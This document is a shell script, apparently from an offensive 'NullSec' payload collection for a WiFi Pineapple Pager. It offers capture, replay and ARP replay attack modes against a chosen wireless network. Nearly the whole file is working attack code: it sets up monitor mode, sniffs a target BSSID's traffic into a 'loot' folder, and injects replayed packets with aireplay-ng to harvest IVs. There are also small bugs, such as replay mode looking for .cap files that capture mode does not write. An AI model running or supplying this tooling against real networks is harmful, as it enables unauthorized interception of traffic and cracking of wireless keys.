#!/bin/sh
#####################################################
# NullSec PacketReplay Payload
# Capture and replay interesting packets
#####################################################
# Author: NullSec Team
# Target: WiFi Pineapple Pager
# Category: Injection/Replay
#####################################################

PAYLOAD_NAME="PacketReplay"
source /root/payloads/library/nullsec-lib.sh 2>/dev/null || true

# Configuration
TARGET_BSSID="${TARGET_BSSID:-$1}"
TARGET_CHANNEL="${TARGET_CHANNEL:-${2:-6}}"
MONITOR_INTERFACE="wlan1mon"
LOOT_DIR="/root/loot/replay"
LOG_FILE="$LOOT_DIR/replay_$(date +%Y%m%d_%H%M%S).log"
MODE="${3:-capture}"  # capture, replay, arp

mkdir -p "$LOOT_DIR"

log() {
    echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

cleanup() {
    log "[!] Stopping packet replay..."
    killall airodump-ng aireplay-ng tcpreplay 2>/dev/null
    airmon-ng stop "$MONITOR_INTERFACE" 2>/dev/null
    exit 0
}

trap cleanup INT TERM

log "=========================================="
log "   NullSec PacketReplay v1.0"
log "=========================================="

if [ -z "$TARGET_BSSID" ] && [ "$MODE" != "list" ]; then
    echo "Usage: $0 <target_bssid> [channel] [mode]"
    echo "Modes: capture, replay, arp, list"
    echo ""
    echo "Examples:"
    echo "  $0 AA:BB:CC:DD:EE:FF 6 capture  - Capture packets"
    echo "  $0 AA:BB:CC:DD:EE:FF 6 replay   - Replay captured packets"
    echo "  $0 AA:BB:CC:DD:EE:FF 6 arp      - ARP replay attack"
    echo "  $0 list                          - List captured packets"
    exit 1
fi

# Setup monitor mode
airmon-ng start wlan1 2>/dev/null
sleep 2
iwconfig "$MONITOR_INTERFACE" channel "$TARGET_CHANNEL" 2>/dev/null

case "$MODE" in
    capture)
        log "[*] Mode: Packet Capture"
        log "[*] Target: $TARGET_BSSID (Channel $TARGET_CHANNEL)"
        log "[*] Capturing interesting packets..."
        
        CAPTURE_FILE="$LOOT_DIR/capture_${TARGET_BSSID//:/}_$(date +%Y%m%d_%H%M%S)"
        
        # Capture with filters for interesting traffic
        airodump-ng "$MONITOR_INTERFACE" \
            -c "$TARGET_CHANNEL" \
            --bssid "$TARGET_BSSID" \
            --write "$CAPTURE_FILE" \
            --output-format pcap 2>/dev/null &
        DUMP_PID=$!
        
        log "[*] Capturing... Press Ctrl+C to stop"
        log "[*] Output: $CAPTURE_FILE"
        
        # Also capture with tcpdump for more detail
        tcpdump -i "$MONITOR_INTERFACE" -w "${CAPTURE_FILE}_detailed.pcap" \
            "ether host $TARGET_BSSID" 2>/dev/null &
        
        wait $DUMP_PID
        ;;
        
    replay)
        log "[*] Mode: Packet Replay"
        
        # Find latest capture
        LATEST_CAP=$(ls -t "$LOOT_DIR"/*.cap 2>/dev/null | head -1)
        
        if [ -z "$LATEST_CAP" ]; then
            log "[!] No capture files found. Run capture mode first."
            exit 1
        fi
        
        log "[*] Replaying: $LATEST_CAP"
        log "[*] Target: $TARGET_BSSID"
        
        # Replay packets
        aireplay-ng -2 -r "$LATEST_CAP" -b "$TARGET_BSSID" "$MONITOR_INTERFACE" 2>&1 | tee -a "$LOG_FILE"
        ;;
        
    arp)
        log "[*] Mode: ARP Replay Attack"
        log "[*] Target: $TARGET_BSSID (Channel $TARGET_CHANNEL)"
        
        # Start capture for IVs
        CAPTURE_FILE="$LOOT_DIR/arp_attack_$(date +%Y%m%d_%H%M%S)"
        airodump-ng "$MONITOR_INTERFACE" \
            -c "$TARGET_CHANNEL" \
            --bssid "$TARGET_BSSID" \
            --write "$CAPTURE_FILE" \
            --output-format pcap 2>/dev/null &
        
        sleep 3
        
        log "[*] Starting ARP replay attack..."
        log "[*] Waiting for ARP packet..."
        
        # ARP replay - wait for packet then replay
        aireplay-ng -3 -b "$TARGET_BSSID" "$MONITOR_INTERFACE" 2>&1 | while read line; do
            log "$line"
            if echo "$line" | grep -q "got"; then
                log "[+] ARP packet captured, replaying..."
            fi
        done
        ;;
        
    list)
        log "[*] Captured packet files:"
        echo ""
        ls -lh "$LOOT_DIR"/*.cap "$LOOT_DIR"/*.pcap 2>/dev/null | while read line; do
            echo "  $line"
        done
        echo ""
        TOTAL=$(ls -1 "$LOOT_DIR"/*.cap "$LOOT_DIR"/*.pcap 2>/dev/null | wc -l)
        log "[*] Total captures: $TOTAL"
        ;;
        
    *)
        log "[!] Unknown mode: $MODE"
        exit 1
        ;;
esac

log "[+] PacketReplay complete"
